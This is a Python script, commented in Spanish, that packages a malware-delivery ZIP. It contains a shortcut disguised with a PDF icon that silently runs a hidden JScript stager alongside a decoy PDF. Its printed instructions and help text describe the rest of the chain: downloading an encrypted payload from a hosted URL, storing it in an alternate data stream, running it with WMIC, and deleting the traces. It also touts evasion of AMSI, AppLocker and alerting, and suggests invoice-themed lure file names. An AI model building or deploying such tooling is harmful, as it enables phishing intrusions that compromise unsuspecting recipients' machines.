#!/usr/bin/env python3
"""
Crear ZIP final para distribución con JScript stager
"""

import sys
import os
import zipfile
import shutil
from pathlib import Path

def create_distribution_zip(js_stager, pdf_file, icon_path, output_zip, lnk_name="Documento.lnk"):
    """
    Crear ZIP con:
    - LNK visible con icono PDF
    - JS stager oculto
    - PDF oculto (opcional)
    """
    
    print(f"[🔧] Creando ZIP de distribución...")
    
    # Crear directorio temporal
    temp_dir = Path("_dist_temp")
    if temp_dir.exists():
        shutil.rmtree(temp_dir)
    temp_dir.mkdir()
    
    try:
        # 1. Crear el LNK
        print(f"[*] Generando .lnk...")
        lnk_path = temp_dir / lnk_name
        
        # Importar win32com
        import win32com.client
        
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(str(lnk_path.absolute()))
        
        js_filename = Path(js_stager).name
        
        shortcut.TargetPath = r"C:\Windows\System32\wscript.exe"
        shortcut.Arguments = f'//B //Nologo "{js_filename}"'
        shortcut.WorkingDirectory = ""  # Vacío = misma carpeta que el LNK
        shortcut.WindowStyle = 7
        
        if icon_path and os.path.exists(icon_path):
            shortcut.IconLocation = f"{os.path.abspath(icon_path)},0"
        
        shortcut.Save()
        print(f"[✅] LNK creado: {lnk_name}")
        
        # 2. Copiar JS stager
        js_dest = temp_dir / Path(js_stager).name
        shutil.copy2(js_stager, js_dest)
        print(f"[✅] JS copiado: {js_dest.name}")
        
        # 3. Copiar PDF si existe
        if pdf_file and os.path.exists(pdf_file):
            pdf_dest = temp_dir / Path(pdf_file).name
            shutil.copy2(pdf_file, pdf_dest)
            print(f"[✅] PDF copiado: {pdf_dest.name}")
        
        # 4. Crear ZIP
        print(f"[🗜️] Comprimiendo...")
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file in temp_dir.iterdir():
                zf.write(file, file.name)
        
        # Limpiar temp
        shutil.rmtree(temp_dir)
        
        # Resultado
        size_mb = Path(output_zip).stat().st_size / (1024*1024)
        print(f"\n[✅] ZIP creado: {output_zip}")
        print(f"[📊] Tamaño: {size_mb:.2f} MB")
        
        print(f"\n[📦] Contenido:")
        print(f"   ✅ {lnk_name} (VISIBLE - con icono PDF)")
        print(f"   👻 {Path(js_stager).name} (oculto en Windows)")
        if pdf_file and os.path.exists(pdf_file):
            print(f"   👻 {Path(pdf_file).name} (oculto en Windows)")
        
        print(f"\n[💡] Instrucciones de uso:")
        print(f"   1. Usuario extrae el ZIP")
        print(f"   2. Solo ve '{lnk_name}' con icono PDF")
        print(f"   3. Hace doble click → se abre PDF + stager en background")
        print(f"   4. Stager descarga payload cifrado")
        print(f"   5. Descifra en memoria con CryptoJS")
        print(f"   6. Almacena en ADS (oculto)")
        print(f"   7. Ejecuta con WMIC (sigiloso)")
        print(f"   8. Auto-destrucción")
        
        print(f"\n[🛡️] Ventajas:")
        print(f"   ✅ JScript no es escaneado por AMSI")
        print(f"   ✅ No bloqueado por AppLocker")
        print(f"   ✅ ADS oculta payload en disco")
        print(f"   ✅ Cifrado AES en tránsito")
        print(f"   ✅ WMIC no levanta alertas")
        
        return True
        
    except Exception as e:
        print(f"[❌] Error: {e}")
        if temp_dir.exists():
            shutil.rmtree(temp_dir)
        return False


def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Crear ZIP de distribución con JScript stager',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Ejemplos:
  # ZIP con stager avanzado (cifrado)
  python create_distribution_zip.py --stager stager-advanced.js --pdf documento.pdf --icon pdf_icon.ico --output "Factura_2025.zip"
  
  # ZIP con stager simple (sin cifrado)
  python create_distribution_zip.py --stager stager-simple.js --pdf factura.pdf --icon pdf_icon.ico --output "Documento.zip" --lnk "Factura.lnk"

Flujo completo:
  1. Cifrar payload: python encrypt_payload.py --input agent.exe --output payload.enc
  2. Subir payload.enc a GitHub/servidor
  3. Actualizar PAYLOAD_URL en stager-advanced.js
  4. Crear ZIP: python create_distribution_zip.py ...
  5. Distribuir el ZIP
'''
    )
    
    parser.add_argument('--stager', required=True, help='Archivo JS stager (advanced o simple)')
    parser.add_argument('--pdf', help='PDF para abrir como decoy')
    parser.add_argument('--icon', required=True, help='Icono .ico para el LNK')
    parser.add_argument('--output', required=True, help='Nombre del ZIP de salida')
    parser.add_argument('--lnk', default='Documento.lnk', help='Nombre del LNK (default: Documento.lnk)')
    
    args = parser.parse_args()
    
    # Validar
    if not os.path.exists(args.stager):
        print(f"[❌] Stager no encontrado: {args.stager}")
        return 1
    
    if not os.path.exists(args.icon):
        print(f"[❌] Icono no encontrado: {args.icon}")
        return 1
    
    if args.pdf and not os.path.exists(args.pdf):
        print(f"[❌] PDF no encontrado: {args.pdf}")
        return 1
    
    success = create_distribution_zip(
        js_stager=args.stager,
        pdf_file=args.pdf,
        icon_path=args.icon,
        output_zip=args.output,
        lnk_name=args.lnk
    )
    
    return 0 if success else 1


if __name__ == '__main__':
    sys.exit(main())
